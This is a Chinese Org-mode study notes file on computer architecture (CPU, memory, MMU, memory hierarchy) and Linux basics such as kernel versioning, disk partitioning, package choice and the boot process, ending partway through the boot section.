#+TITLE: 工作与项目
#+AUTHOR: LavenLiu
#+DATE: 2010-08-20
#+EMAIL: ldczz2008@163.com 

#+STARTUP: OVERVIEW
#+TAGS: OFFICE(o) HOME(h) PROJECT(p) CHANGE(c) REPORT(r) MYSELF(m) 
#+TAGS: PROBLEM(P) INTERRUPTTED(i) RESEARCH(R)
#+SEQ_TODO: TODO(t)  STARTED(s) WAITING(W) | DONE(d) CANCELLED(C) DEFERRED(f)
#+COLUMNS: %40ITEM(Details) %TAGS(Context) %7TODO(To Do) %5Effort(Time){:} %6CLOCKSUM{Total}

#+LaTeX_CLASS: article
#+LaTeX_CLASS_OPTIONS: [a4paper,11pt]
#+LaTeX_HEADER: \usepackage[top=2.1cm,bottom=2.1cm,left=2.1cm,right=2.1cm]{geometry}
#+LaTeX_HEADER: \setmainfont[Mapping=tex-text]{Times New Roman}
#+LaTeX_HEADER: \setsansfont[Mapping=tex-text]{Tahoma}
#+LaTeX_HEADER: \setmonofont{Courier New}
#+LaTeX_HEADER: \setCJKmainfont[BoldFont={Adobe Heiti Std},ItalicFont={Adobe Kaiti Std}]{Adobe Song Std}
#+LaTeX_HEADER: \setCJKsansfont{Adobe Heiti Std}
#+LaTeX_HEADER: \setCJKmonofont{Adobe Fangsong Std}
#+LaTeX_HEADER: \punctstyle{hangmobanjiao}
#+LaTeX_HEADER: \usepackage{color,graphicx}
#+LaTeX_HEADER: \usepackage[table]{xcolor}
#+LaTeX_HEADER: \usepackage{colortbl}
#+LaTeX_HEADER: \usepackage{listings}
#+LaTeX_HEADER: \usepackage[bf,small,indentafter,pagestyles]{titlesec}

#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="css/style2.css" />

#+OPTIONS: ^:nil
#+OPTIONS: tex:t

* Computer Architecture
  [[http://akaedu.github.io/book/][本章原文内容来源]]
  
  现代计算机都是基于冯.诺依曼体系结构，不管是嵌入式系统、PC还是服务器。
  这种体系结构的主要特点是：CPU（CPU，Central Processing Unit，中央处
  理器，或简称处理器Processor）和内存（Memory）是计算机的两个主要组成
  部分，内存中保存着数据和指令，CPU从内存中取指令（Fetch）执行，其中有
  些指令让CPU做运算，有些指令让CPU读写内存中的数据。
** 内存与地址
   #+CAPTION: 邮箱的地址
   [[./images/arch.pobox.png]]

   这种挂在墙上的邮箱我们生活中经常见到，每个邮箱有一个房间编号，根据
   房间编号找到相应的邮箱投入信件或取出信件。内存与此类似，每个内存单
   元有一个地址（Address），内存地址是从0开始编号的整数，CPU通过地址找
   到相应的内存单元，取出其中的指令或者读写其中的数据。与邮箱不同的是，
   一个地址对应的内存单元不能存很多东西，只能存放一个字节，像int、
   float等多字节的数据类型保存在内存中要占用连续的多个地址，这种情况下
   数据的地址是它所占内存单元的起始地址。
** CPU
   CPU总是周而复始地做同一件事：从内存取指令，然后解释执行它，然后再取
   下一条指令，再次解释执行。CPU最核心的功能单元包括：
   + 寄存器（Register），是CPU内部的高速存储器，像内存一样可以存取数据，
     但比访问内存快得多。有些寄存器只能用于某种特定的用途，比如eip用作
     程序计数器，这称为特殊寄存器（Special-purpose Register），而另外
     一些寄存器可以用在各种运算和读写内存的指令中，比如eax等寄存器，这
     称为通用寄存器（General-purpose Register）。
   + 程序计数器（PC，Program Counter），是一种特殊寄存器，保存着CPU取
     下一条指令的地址，CPU按程序计数器保存的地址去内存中取指令然后解释
     执行，这时程序计数器保存的地址会自动加上该指令的长度，指向内存中
     的下一条指令。
   + 指令译码器（Instruction Decoder），CPU取过来的指令由若干字节组成，
     这些字节中有些表示内存地址，有些表示寄存器编号，有些表示这种指令
     做什么操作，是加减乘除还是读写内存，指令译码器负责解释这条指令的
     含义，然后调动相应的执行单元去执行它。
   + 算术逻辑单元（ALU，Arithmetic and Logic Unit），如果译码器将一条
     指令解释为运算指令，就调动算术逻辑单元去做运算，比如加减乘除、位
     运算、逻辑运算。指令中会指示运算结果保存到哪里，可能保存到寄存器
     中，也可能保存到内存中。
   + 地址和数据总线（Bus），CPU和内存之间用地址总线、数据总线和控制总
     线连接起来，每条线上有0和1两种状态。如果在执行指令过程中需要访问
     内存，比如从内存读一个数到寄存器，执行过程可以想象成这样：

	 #+CAPTION: 访问内存读数据的过程
	 [[./images/arch.readmem.png]]
	 1. CPU内部将寄存器对接到数据总线上，使寄存器的每一位对接到一条数
        据线，等待接收数据。
	 2. CPU通过控制线发一个读请求，并且将内存地址通过地址线发给内存。
	 3. 内存收到地址和读请求之后，将相应的内存单元对接到数据总线的另一
        端，这样，内存单元每一位的1或0状态通过一条数据线到达CPU寄存器
        中相应的位，就完成了数据传送。

	 往内存里写数据的过程与此类似，只是数据线上的传输方向相反。

	 上图中画了32条地址线和32条数据线，CPU寄存器也是32位，可以说这种体
     系结构是32位的，比如x86就是这样的体系结构，目前主流的处理器是32位
     或64位的。地址线、数据线和CPU寄存器的位数通常是一致的，从上图可以
     看出数据线和CPU寄存器的位数应该一致，另外有些寄存器（比如程序计数
     器）需要保存一个内存地址，因而地址线和CPU寄存器的位数也应该一致。
     处理器的位数也称为字长，字（Word）这个概念用得比较混乱，在有些上
     下文中指16位，在有些上下文中指32位（这种情况下16位被称为半字Half
     Word），在有些上下文中指处理器的字长，如果处理器是32位那么一个字
     就是32位，如果处理器是64位那么一个字就是64位。32位计算机有32条地
     址线，地址空间（Address Space）从0x00000000到0xffffffff，共4GB，
     而64位计算机有更大的地址空间。

	 最后还要说明一点，本节所说的地址线、数据线是指CPU的内总线，是直接
     和CPU的执行单元相连的，内总线经过MMU和总线接口的转换之后引出到芯
     片引脚才是外总线，外地址线和外数据线的位数都有可能和内总线不同，
     例如32位处理器的外地址总线可寻址的空间可以大于4GB。
*** CPU的取指令执行过程
	#+CAPTION: CPU取指令执行过程
	[[./images/arch.von.png]]
	
	1. eip寄存器指向地址0x80483a2，CPU从这里开始取一条5个字节的指令，
       然后eip寄存器指向下一条指令的起始地址0x80483a7。
	2. CPU对这5个字节译码，得知这条指令要求从地址0x804a01c开始取4个字
       节保存到eax寄存器。
	3. 执行指令，读内存，取上来的数是3，保存到eax寄存器。注意，地址
       0x804a01c~0x804a01f里存储的四个字节不能按地址从低到高的顺序看成
       0x03000000，而要按地址从高到低的顺序看成0x00000003。也就是说，
       对于多字节的整数类型，低地址保存的是整数的低位，这称为小端
       （Little Endian）字节序（Byte Order）。x86平台是小端字节序的，
       而另外一些平台规定低地址保存整数的高位，称为大端（Big Endian）
       字节序。
	4. CPU从eip寄存器指向的地址取一条3个字节的指令，然后eip寄存器指向
       下一条指令的起始地址0x80483aa。
	5. CPU对这3个字节译码，得知这条指令要求把eax寄存器的值加1，结果仍
       保存到eax寄存器。
	6. 执行指令，现在eax寄存器中的数是4。
	7. CPU从eip寄存器指向的地址取一条5个字节的指令，然后eip寄存器指向
       下一条指令的起始地址0x80483af。
	8. CPU对这5个字节译码，得知这条指令要求把eax寄存器的值保存到从地址
       0x804a018开始的4个字节。
	9. 执行指令，把4这个值保存到从地址0x804a018开始的4个字节（按小端字
       节序保存）。
** 设备
   CPU执行指令除了访问内存之外还要访问很多设备（Device），如键盘、鼠标、
   硬盘、显示器等，那么它们和CPU之间如何连接呢？如下图所示。
   #+CAPTION: 设备
   [[./images/arch.box.png]]

   有些设备像内存芯片一样连接到处理器的地址总线和数据总线，正因为地址
   线和数据线上可以挂多个设备和内存芯片所以才叫“总线”，但不同的设备和
   内存芯片应该占不同的地址范围。访问这种设备就像访问内存一样，按地址
   读写即可，但和访问内存不同的是，往一个地址写数据只是给设备发一个命
   令，数据不一定要保存，而从一个地址读数据也不一定是读先前保存在这个
   地址的数据，而是得到设备的当前状态。设备中可供读写访问的单元通常称
   为设备寄存器（注意和CPU寄存器不是一回事），操作设备的过程就是读写这
   些设备寄存器的过程，比如向串口发送寄存器里写数据，串口设备就会把数
   据发送出去，读串口接收寄存器的值，就可以读取串口设备接收到的数据。

   还有一些设备集成在处理器芯片中。在上图中，从CPU核引出的地址和数据总
   线有一端经总线接口引出到芯片引脚上了，还有一端没有引出，而是接到芯
   片内部集成的设备上，无论是在CPU外部接总线的设备还是在CPU内部接总线
   的设备都有各自的地址范围，都可以像访问内存一样访问，很多体系结构
   （比如ARM）采用这种方式操作设备，称为内存映射I/O（Memory-mapped
   I/O）。但是x86比较特殊，x86对于设备有独立的端口地址空间，CPU核需要
   引出额外的地址线来连接片内设备（和访问内存所用的地址线不同），访问
   设备寄存器时用特殊的in/out指令，而不是和访问内存用同样的指令，这种
   方式称为端口I/O（Port I/O）。

   从CPU的角度来看，访问设备只有内存映射I/O和端口I/O两种，要么像内存一
   样访问，要么用一种专用的指令访问。其实访问设备是相当复杂的，计算机
   的设备五花八门，各种设备的性能要求都不一样，有的要求带宽大，有的要
   求响应快，有的要求热插拔，于是出现了各种适应不同要求的设备总线，比
   如PCI、AGP、USB、1394、SATA等等，这些设备总线并不直接和CPU相连，CPU
   通过内存映射I/O或端口I/O访问相应的总线控制器，通过总线控制器再去访
   问挂在总线上的设备。所以上图中标有“设备”的框可能是实际的设备，也可
   能是设备总线的控制器。

   在x86平台上，硬盘是挂在IDE、SATA或SCSI总线上的设备，保存在硬盘上的
   程序是不能被CPU直接取指令执行的，操作系统在执行程序时会把它从硬盘拷
   贝到内存，这样CPU才能取指令执行，这个过程称为加载（Load）。程序加载
   到内存之后，成为操作系统调度执行的一个任务，就称为进程（Process）。
   进程和程序不是一一对应的。一个程序可以多次加载到内存，成为同时运行
   的多个进程，例如可以同时开多个终端窗口，每个窗口都运行一个Shell进程，
   而它们对应的程序都是磁盘上的/bin/bash文件。

   操作系统（Operating System）本身也是一段保存在磁盘上的程序，计算机
   在启动时执行一段固定的启动代码（称为Bootloader）首先把操作系统从磁
   盘加载到内存，然后执行操作系统中的代码把用户需要的其它程序加载到内
   存。操作系统和其它用户程序的不同之处在于：操作系统是常驻内存的，而
   其它用户程序则不一定，用户需要运行哪个程序，操作系统就把它加载到内
   存，用户不需要哪个程序，操作系统就把它终止掉，释放它所占的内存。操
   作系统最核心的功能是管理进程调度、管理内存的分配使用和管理各种设备，
   做这些工作的程序称为内核（Kernel），在我的系统上内核程序是
   /boot/vmlinuz-2.6.28-13-generic文件，它在计算机启动时加载到内存并常
   驻内存。广义上操作系统的概念还包括一些必不可少的用户程序，比如Shell
   是每个Linux系统必不可少的，而Office办公套件则是可有可无的，所以前者
   也属于广义上操作系统的范畴，而后者属于应用软件。

   访问设备还有一点和访问内存不同。内存只是保存数据而不会产生新的数据，
   如果CPU不去读它，它也不需要主动提供数据给CPU，所以内存总是被动地等
   待被读或者被写。而设备往往会自己产生数据，并且需要主动通知CPU来读这
   些数据，例如敲键盘产生一个输入字符，用户希望计算机马上响应自己的输
   入，这就要求键盘设备主动通知CPU来读这个字符并做相应处理，给用户响应。
   这是由中断（Interrupt）机制实现的，每个设备都有一条中断线，通过中断
   控制器连接到CPU，当设备需要主动通知CPU时就引发一个中断信号，CPU正在
   执行的指令将被打断，程序计数器会指向某个固定的地址（这个地址由体系
   结构定义），于是CPU从这个地址开始取指令（或者说跳转到这个地址），执
   行中断服务程序（ISR，Interrupt Service Routine），完成中断处理之后
   再返回先前被打断的地方执行后续指令。比如某种体系结构规定发生中断时
   跳转到地址0x00000010执行，那么就要事先把一段ISR程序加载到这个地址，
   ISR程序是内核代码的一部分，在这段代码中首先判断是哪个设备引发了中断，
   然后调用该设备的中断处理函数做进一步处理。

   由于各种设备的操作方法各不相同，每种设备都需要专门的设备驱动程序
   （Device Driver），一个操作系统为了支持广泛的设备就需要有大量的设备
   驱动程序，事实上Linux内核源代码中绝大部分是设备驱动程序。设备驱动程
   序通常是内核里的一组函数，通过读写设备寄存器实现对设备的初始化、读、
   写等操作，有些设备还要提供一个中断处理函数供ISR调用。
** MMU
   现代操作系统普遍采用虚拟内存管理（Virtual Memory Management）机制，
   这需要处理器中的MMU（Memory Management Unit，内存管理单元）提供支持，
   本节简要介绍MMU的作用。

   首先引入两个概念，虚拟地址和物理地址。如果处理器没有MMU，或者有MMU
   但没有启用，CPU执行单元发出的内存地址将直接传到芯片引脚上，被内存芯
   片（以下称为物理内存，以便与虚拟内存区分）接收，这称为物理地址
   （Physical Address，以下简称PA），如下图所示。
   #+CAPTION: 物理地址
   [[./images/arch.pabox.png]]

   如果处理器启用了MMU，CPU执行单元发出的内存地址将被MMU截获，从CPU到
   MMU的地址称为虚拟地址（Virtual Address，以下简称VA），而MMU将这个地
   址翻译成另一个地址发到CPU芯片的外部地址引脚上，也就是将VA映射成PA，
   如下图所示。
   #+CAPTION: 虚拟地址
   [[.images/arch.vabox.png]]

   如果是32位处理器，则内地址总线是32位的，与CPU执行单元相连（图中只是
   示意性地画了4条地址线），而经过MMU转换之后的外地址总线则不一定是32
   位的。也就是说，虚拟地址空间和物理地址空间是独立的，32位处理器的虚
   拟地址空间是4GB，而物理地址空间既可以大于也可以小于4GB。

   MMU将VA映射到PA是以页（Page）为单位的，32位处理器的页尺寸通常是4KB。
   例如，MMU可以通过一个映射项将VA的一页0xb7001000~0xb7001fff映射到PA
   的一页0x2000~0x2fff，如果CPU执行单元要访问虚拟地址0xb7001008，则实
   际访问到的物理地址是0x2008。物理内存中的页称为物理页面或者页帧
   （Page Frame）。虚拟内存的哪个页面映射到物理内存的哪个页帧是通过页
   表（Page Table）来描述的，页表保存在物理内存中，MMU会查找页表来确定
   一个VA应该映射到什么PA。

   操作系统和MMU是这样配合的：
   1. 操作系统在初始化或分配、释放内存时会执行一些指令在物理内存中填写
      页表，然后用指令设置MMU，告诉MMU页表在物理内存中的什么位置。
   2. 设置好之后，CPU每次执行访问内存的指令都会自动引发MMU做查表和地址
      转换操作，地址转换操作由硬件自动完成，不需要用指令控制MMU去做。

   我们在程序中使用的变量和函数都有各自的地址，程序被编译后，这些地址
   就成了指令中的地址，指令中的地址被CPU解释执行，就成了CPU执行单元发
   出的内存地址，所以在启用MMU的情况下，程序中使用的地址都是虚拟地址，
   都会引发MMU做查表和地址转换操作。那为什么要设计这么复杂的内存管理机
   制呢？多了一层VA到PA的转换到底换来了什么好处？All problems in
   computer science can be solved by another level of indirection.还记
   得这句话吗？多了一层间接必然是为了解决什么问题的，等讲完了必要的预
   备知识之后，将在第 5 节 “虚拟内存管理”讨论虚拟内存管理机制的作用。

   MMU除了做地址转换之外，还提供内存保护机制。各种体系结构都有用户模式
   （User Mode）和特权模式（Privileged Mode）之分，操作系统可以在页表
   中设置每个内存页面的访问权限，有些页面不允许访问，有些页面只有在CPU
   处于特权模式时才允许访问，有些页面在用户模式和特权模式都可以访问，
   访问权限又分为可读、可写和可执行三种。这样设定好之后，当CPU要访问一
   个VA时，MMU会检查CPU当前处于用户模式还是特权模式，访问内存的目的是
   读数据、写数据还是取指令，如果和操作系统设定的页面权限相符，就允许
   访问，把它转换成PA，否则不允许访问，产生一个异常（Exception）。异常
   的处理过程和中断类似，不同的是中断由外部设备产生而异常由CPU内部产生，
   中断产生的原因和CPU当前执行的指令无关，而异常的产生就是由于CPU当前
   执行的指令出了问题，例如访问内存的指令被MMU检查出权限错误，除法指令
   的除数为0等都会产生异常。
   
   #+CAPTION: 处理器模式
   [[./images/arch.cpumode.png]]

   通常操作系统把虚拟地址空间划分为用户空间和内核空间，例如x86平台的
   Linux系统虚拟地址空间是0x00000000~0xffffffff，前
   3GB（0x00000000~0xbfffffff）是用户空间，后
   1GB（0xc0000000~0xffffffff）是内核空间。用户程序加载到用户空间，在
   用户模式下执行，不能访问内核中的数据，也不能跳转到内核代码中执行。
   这样可以保护内核，如果一个进程访问了非法地址，顶多这一个进程崩溃，
   而不会影响到内核和整个系统的稳定性。CPU在产生中断或异常时不仅会跳转
   到中断或异常服务程序，还会自动切换模式，从用户模式切换到特权模式，
   因此从中断或异常服务程序可以跳转到内核代码中执行。事实上，整个内核
   就是由各种中断和异常处理程序组成的。总结一下：在正常情况下处理器在
   用户模式执行用户程序，在中断或异常情况下处理器切换到特权模式执行内
   核程序，处理完中断或异常之后再返回用户模式继续执行用户程序。
   
   段错误我们已经遇到过很多次了，它是这样产生的：
   1. 用户程序要访问一个VA，经MMU检查无权访问
   2. MMU产生一个异常，CPU从用户模式切换到特权模式，跳转到内核代码中执
      行异常服务程序
   3. 内核把这个异常解释为段错误，把引发异常的进程终止掉
** Memory Hierarchy
   硬盘、内存、CPU寄存器，还有本节要讲的Cache，这些都是存储器，计算机
   为什么要有这么多种存储器呢？这些存储器各自有什么特点？这是本节要讨
   论的问题。

   由于硬件技术的限制，我们可以制造出容量很小但很快的存储器，也可以制
   造出容量很大但很慢的存储器，但不可能两边的好处都占着，不可能制造出
   访问速度又快容量又大的存储器。因此，现代计算机都把存储器分成若干级，
   称为Memory Hierarchy，按照离CPU由近到远的顺序依次是CPU寄存器、Cache、
   内存、硬盘，越靠近CPU的存储器容量越小但访问速度越快，下图给出了各种
   存储器的容量和访问速度的典型值。
   
   #+CAPTION: Memory Hierarchy
   [[./images/arch.memhie.png]]

   | 存储器类型 | 位于哪里                          | 存储容量                       | 半导体工艺                                                                 | 访问时间                       | 如何访问                                                                                                                                                                                                                |
   |------------+-----------------------------------+--------------------------------+----------------------------------------------------------------------------+--------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
   | CPU寄存器  | 位于CPU执行单元中                 | CPU寄存器通常只用              | "寄存器"这个名字就是一种数字电路的名字，                                   | 寄存器是访问速度最快的存储器， |                                                                                                                                                                                                                         |
   |            |                                   | 几个到几十个，每个             | 它由一组触发器（Flip-flop）组成，                                          | 典型的访问时间是几纳秒。       |                                                                                                                                                                                                                         |
   |            |                                   | 寄存器的容量取决于             | 每个触发器保存一个Bit的数据，                                              |                                | 使用哪个寄存器，如何使用寄存器，这些都是由指令决定的。                                                                                                                                                                  |
   |            |                                   | CPU的字长，所以一共只有        | 可以做存取和移位等操作。                                                   |                                |                                                                                                                                                                                                                         |
   |            |                                   | 几十到几百字节                 | 计算机掉电时寄存器中保存的数据会丢失。                                     |                                |                                                                                                                                                                                                                         |
   |------------+-----------------------------------+--------------------------------+----------------------------------------------------------------------------+--------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
   | Cache      | 和MMU一样位于CPU核中              | Cache通常分为几级，最典型      | Cache和内存都是由RAM（Random Access Memory）组成的，可以根据地址随机访问， |                                | Cache缓存最近访问过的内存数据，由于Cache的访问速度是内存的几十倍，所以有效利用Cache可以大大提高计算机的整体性能。                                                                                                       |
   |            |                                   | 的是如上图所示的两级Cache，    | 计算机掉电时RAM中保存的数据会丢失。                                        |                                | 一级Cache是这样工作的：CPU执行单元要访问内存时首先发出VA，Cache利用VA查找相应的数据有没有被缓存，如果Cache中有就不需要访问物理内存了，如果是读操作就直接将Cache中的数据传给CPU寄存器，如果是写操作就直接改写到Cache中； |
   |            |                                   | 一级Cache更靠近CPU执行单元，   | 不同的是，Cache通常由SRAM（Static RAM，静态RAM）组成，                     | 典型的访问时间是几十纳秒       | 如果Cache没有缓存该数据，就去物理内存中取数据，但并不是要哪个字节就取哪个字节，而是把相邻的几十个字节都取上来缓存着，以备下次用到，这称为一个Cache Line，                                                               |
   |            |                                   | 二级Cache更靠近物理内存，      | 而内存通常由DRAM（Dynamic RAM，动态RAM）组成。                             |                                | 典型的Cache Line大小是32~256字节。如果计算机还配置了二级缓存，则在访问物理内存之前先用PA去二级缓存中查找。                                                                                                              |
   |            |                                   | 通常一级Cache有几十到几百KB，  | DRAM电路比SRAM简单，存储容量可以做得更大，                                 |                                | 一级缓存是用VA寻址的，二级缓存是用PA寻址的，这是它们的区别。                                                                                                                                                            |
   |            |                                   | 二级Cache有几百KB到几MB        | 但DRAM的访问速度比SRAM慢。                                                 |                                | Cache所做的工作是由硬件自动完成的，而不是像寄存器一样由指令决定先做什么后做什么。                                                                                                                                       |
   |------------+-----------------------------------+--------------------------------+----------------------------------------------------------------------------+--------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
   | 内存       | 位于CPU外的芯片，                 | 典型的存储容量是               | 由DRAM组成，                                                               | 典型的访问时间是几百纳秒。     | 内存是通过地址来访问的，在启用MMU的情况下，程序指令中的地址是VA，                                                                                                                                                       |
   |            | 与CPU通过地址和数据总线相连。     | 几百MB到几GB。                 | 详见上面关于Cache的说明。                                                  |                                | 而访问内存用的是PA，它们之间的映射关系由操作系统维护。                                                                                                                                                                  |
   |------------+-----------------------------------+--------------------------------+----------------------------------------------------------------------------+--------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
   | 硬盘       | 位于设备总线上，                  | 典型的存储容量是几百GB到几TB。 | 硬盘由磁性介质和磁头组成，访问硬盘时存在机械运动，                         | 典型的访问时间是几毫秒，       | 由驱动程序操作设备总线控制器去访问。                                                                                                                                                                                    |
   |            | 并不直接和CPU相连，               |                                | 磁头要移动，磁性介质要旋转，机械运动的速度很难提高到电子的速度，           | 是寄存器访问时间的10^6倍。     | 由于硬盘的访问速度较慢，操作系统通常一次从硬盘上读几个页面到内存中缓存起来，如果这几个页面后来都被程序访问到了，                                                                                                        |
   |            | CPU通过设备总线的控制器访问硬盘。 |                                | 所以访问速度很受限制。保存在硬盘上的数据掉电后不会丢失。                   |                                | 那么这一次读硬盘的时间就可以分摊（Amortize）给程序的多次访问了。                                                                                                                                                                                                                        |

   对这个表的总结如下：
   + 寄存器、Cache和内存中的数据都是掉电丢失的，这称为易失性存储器
     （Volatile Memory），与之相对的，硬盘是一种非易失性存储器
     （Non-volatile Memory）。
   + 除了访问寄存器由程序指令直接控制之外，访问其它存储器都不是由指令
     直接控制的，有些是硬件自动完成的，有些是操作系统配合硬件完成的。
   + Cache从内存取数据时会预取一个Cache Line缓存起来，操作系统从硬盘读
     数据时会预读几个页面缓存起来，都是希望这些数据以后会被程序访问到。
     大多数程序的行为都具有局部性（Locality）的特点：它们会花费大量的
     时间反复执行一小段代码（例如循环），或者反复访问一个很小的地址范
     围中的数据（例如访问一个数组）。所以预读缓存的办法是很有效的：CPU
     取一条指令，我把和它相邻的指令也都缓存起来，CPU很可能马上就会取到；
     CPU访问一个数据，我把和它相邻的数据也都缓存起来，CPU很可能马上就
     会访问到。设想有两台计算机，一台有256KB的Cache，另一台没有Cache，
     两台计算机的内存都是512MB的，硬盘都是100GB的，虽然多出来256KB的
     Cache与内存、硬盘的容量相比微不足道，但访问Cache比访问内存、硬盘
     快几个数量级，由于局部性原理，CPU大部分时间是在和Cache打交道，有
     Cache的计算机明显会快很多。高速存储器的容量只能做得很小，却能显著
     提升计算机的性能，这就是Memory Hierarchy的意义所在。
** 基本知识点
*** 内存
	写入数据到内存，称为缓冲区（buffer）；从内存读取数据，内存空间
	（cache）。由于95%的网站都是读取为主，写入为辅，读写比例至少10:1，
	所以写入并发不是问题。
*** 硬盘
	永久存放数据的存储器。常用的3.5英寸的（IDE，SAS，SATA）硬盘，机械
	磁盘，读取（性能不高）性能比内存差很多，所以工作中，我们把大量的数
	据缓存到内存，是必备的解决方案。
	
	硬盘接口或类型：IDE，SCSI，SAS，SATA，PCIe

	性能：SSD > SAS > SATA

	企业应用：
	1. 常规正式工作场景选SAS硬盘（转速是15000转/分，机械磁盘转速高的性
       能较好）
	2. 不对外提供访问的服务器，例如：线下的数据备份，可选
       SATA（7200-10000转/分）。SATA特点：容量大，价格便宜，但速度比相
       对较慢。
	3. 高并发访问，小数据量，可以选择SSD。
	   #+BEGIN_EXAMPLE
	   淘宝网企业案例：服务器会把SATA和SSD结合起来用，
	   热点存储（访问量大的数据放在SSD中），程序动态调度。
	   #+END_EXAMPLE
* Gnu/Linux
  #+INDEX: Gnu
** CentOS版本选择
   主流版本：6.2 6.4 6.6

   Linux内核版本号的解释，
   #+BEGIN_SRC sh
# uname -r
2.6.32-573.12.1.el6.x86_64
# 2.6.32中的2表示主版本号，有结构性变化才更改；
# 2.6.32中的6表示次版本号，新增功能时才变化，一般奇数表示开发版；偶数表示稳定版；
# 2.6.32中的32表示对次版本的修订次数或补丁包数；
# 573表示编译的次数，每次编译可对少数程序优化或修改；
# el表示企业版Linux；
# pp表示测试版；
# fc表示fedroa core；
# rc表示候选版；
# x86_64表示64为系统；
   #+END_SRC   
** Gnu/Linux系统分区
   分区可以最多有4个主分区和一个扩展分区。扩展分区不能单独使用，需要在
   扩展分区上再次进行划分逻辑分区，才可使用。

   分区的编号1-4，只能是主分区和扩展分区。逻辑分区从编号5开始。

   硬盘在Linux中的标识：
   1. IDE接口的硬盘显示为/dev/hdn
   2. SCSI（SAS、SATA、SSD）接口的硬盘显示为/dev/sdn
   3. PCIe接口的硬盘（一般为闪存，即SSD），显示方式各有不同（以厂商标
      准为准）
*** Gnu/Linux对系统分区的要求
	1. 最少要有一个根（/）分区，用来存放系统文件及程序。其大小至少在5G以上。
	2. 要有一个交换（swap）分区，它的作用相当于虚拟内存。其大小一般为
       物理内存的1.5倍（内存小于8G）。当系统内存大于8G时，swap分区大小
       可以为8-16G即可，太大则浪费磁盘空间。swap分区不是必须的，但大多
       数情况下还是设置比较好，个别企业的数据库应用场景不分swap分区。
	3. /boot分区，引导分区，用于存放系统引导文件，如Linux内核等。该分
       区大小一般只有几十MB，并且以后也不会增大太多。因此，该分区大小
       可以设置为100-200MB。这个分区也不是必须的。

    如果没有特殊需求，一般不选择LVM和软RAID分区。
** Linux安装包选择建议
   首选选择最小化安装，然后再选择自定义，
   1. Base System
	  + Minimal
	  + Compatibility libraries
	  + Debugging Tools
   2. Development
	  + Development tools

   安装以上软件包即可。
** Linux内核结构
   #+CAPTION: Linux内核结构1
   #+BEGIN_SRC ditaa :file images/linux01.png
   +---------------------------------------+
   |                Applications           |
   |                                       |
   +-------------------+                   |
   |    cBLU           |   cRED            |
   |    Libraries      |                   |
   +-------------------+-------------------+
   |                                       |
   |   Kernel          +-------------------+
   |   cYEL            |           cGRE    |
   |           +-------+--------+  Drivers |
   |           |   Firmware c1AB|          |
   +-----------+----------------+----------+
   |               Hardware   c1AC         |
   +---------------------------------------+
   #+END_SRC

   #+RESULTS:
   [[file:images/linux01.png]]

   #+CAPTION: Linux内核结构2
   #+BEGIN_SRC ditaa :file images/linux02.png :cmdline -E -r -s 1.0
   +---------------------------------------+
   |                Applications           |
   |                cRED                   |
   +-------------------+                   |
   |    cBLU           |                   |
   |    Libraries      |                   |
   +-------------------+-------------------+
   |                                       |
   |   Kernel          +-------------------+
   |   cYEL            |           cGRE    |
   |           +-------+--------+  Drivers |
   |           |   Firmware c1AF|          |
   +-----------+----------------+----------+
   |               Hardware  c1AC          |
   +---------------------------------------+
   #+END_SRC

   #+RESULTS:
   [[file:images/linux02.png]]

   #+CAPTION: Linux内核结构3
   #+BEGIN_SRC ditaa :file images/linux03.png :cmdline -E
   +---------------------------------------+
   |                Applications           |
   |                cRED                   |
   +-------------------+                   |
   |    cBLU           |                   |
   |    Libraries      |                   |
   +-------------------+-------------------+
   |                                       |
   |   Kernel          +-------------------+
   |   cYEL            |           cGRE    |
   |           +-------+--------+  Drivers |
   |           |   Firmware c1AF|          |
   +-----------+----------------+----------+
   |               Hardware  c1AC          |
   +---------------------------------------+
   #+END_SRC

   #+RESULTS:
   [[file:images/linux03.png]]
   
** 系统启动流程
   开机过程指的是从打开计算机电源直到Linux显示用户登录画面的全过程。
   分析Linux开机过程也是深入了解Linux内核工作原理一个很好的途径。
*** 详细介绍
**** 加载BIOS
	 当我们打开计算机电源，计算机会首先加载BIOS信息，BIOS信息是如此的
	 重要，以至于计算机必须在最开始就找到它。这是因为BIOS中包含了CPU的
	 相关信息、设备启动顺序信息、硬盘信息、内存信息、时钟信息、PnP特性
	 等等。在此之后，计算机心里有谱了，知道应该去读取哪个硬件设备了。
	 在BIOS将系统的控制权交给硬盘第一个扇区之后，就开始有Linux来控制系
	 统了。
**** 读取主引导记录
	 硬盘上第0磁道第一个扇区被称为MBR，也就是Master Boot Record，即主
	 引导记录，它的大小是512字节，可里面却存放了预启动信息、分区信息。
	 可分为两部分：
	 1. 第一部分为引导(PRE-BOOT)区，占了446个字节；
	 2. 第二部分为分区表(PARTITION TABLE)，共有64个字节，记录硬盘的
        分区信息；
	 
	 预引导区的作用之一是找到标记为活动(ACTIVE)的分区，并将活动分区
	 的引导区读入内存。剩余两个字节为结束标记。

	 系统找到BIOS所指定的硬盘的MBR后，就会将其复制到0x7c00地址所在的物
	 理内存中。其实被复制到物理内存的内容就是Boot Loader，而具体到我们
	 的电脑，那就是lilo或者grub了。
**** 启动加载器
	 启动加载器(Boot Loader)就是在操作系统内核运行之前运行的一段小程
	 序。通过这段小程序，我们可以初始化硬件设备、建立内存空间的映射图，
	 从而将系统的软硬件环境带到一个合适的状态，以便为最终调用操作系统
	 内核做好一切准备。通常，Boot Loader是严重地依赖于硬件而实现的，不
	 同体系结构的系统存在着不同的Boot Loader。

	 Linux的引导扇区内容是采用汇编语言编写的程序，其源代码在
	 arch/i386/boot中(不同体系的CPU有其各自的boot目录)，有4个程序文件：
	 + bootsect.S，引导扇区的主程序，汇编后的代码不超过512字节，即一个
       扇区大小
	 + setup.S，引导辅助程序
	 + edd.S，辅助程序的一部分，用于支持BIOS增强磁盘设备服务
	 + video.S，辅助程序的一部分，用于引导时的屏幕显示

	 Boot Loader有若干种，其中Grub、Lilo和spfdisk是常见的Loader，这里
	 以Grub为例来说明。

	 系统读取内存中的grub配置信息(一般为menu.lst或grub.lst)，并依照
	 此配置信息来启动不同的操作系统。
**** 加载内核
	 根据grub设定的内核映像所在路径，系统读取内存映像，并进行解压缩操
	 作。此时，屏幕一般会输出“Uncompressing Linux(解压内核中)”的提示。
	 当解压缩内核完成后，屏幕输出“OK, booting the kernel(正在启动内核)”。

